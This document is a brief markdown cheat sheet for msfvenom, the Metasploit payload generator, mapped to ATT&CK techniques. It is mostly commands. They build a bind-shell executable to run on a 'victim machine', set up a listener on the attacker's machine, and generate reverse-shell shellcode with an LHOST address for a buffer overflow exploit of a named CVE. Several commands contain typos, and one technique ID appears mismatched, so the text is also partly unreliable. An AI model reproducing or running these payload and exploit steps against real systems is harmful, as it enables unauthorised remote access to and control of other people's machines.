# MSFVenom

## Usage
   - Payload generator and shellcode encoder

## ATT&CK
   - Execution
     - Exploitation for Client Execution (T1023) 
   - Privilege Escalation
     - Exploitation for Privilege Escalation (T1068)
  
## Link
   - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom

## Commands
   - Client Execution
     - ```msfvenom --list payload | grtep windows```
       - list of windows payloads 
     - ```msfvenom -p windows/meterpreter_bind_tcp -a x86 -f exe -o bind.exe --platform windows```
       - Create a malicious exe to run in victim machine
     - ```msfconsole``` & ```set PAYLAOD windows/meterpreter_bin_tcp``` & ```set LPORT 4444``` & ```set LHOST 192.168.1.1```
       - Receive the shell in attacker machine 
   - Options
     - ```msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -b '\x00\x0d\x0a' -k -f python```
   - Privilege Escalation
     - ```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.17 LPORT=4444 -f python -a x86 -b '\x00\x22\x0d\x0a'```
       - Use the output shell code in Buffer Overflow exploit of "CVE-2018-7573"
       - also the payload size must be changed (nops: 40 => 32)
       - Run vulnerable app in victim machine
       - Run the exploit in attacker machine to send payload to victim target
       - Listen to port on attacker machine to receive shell
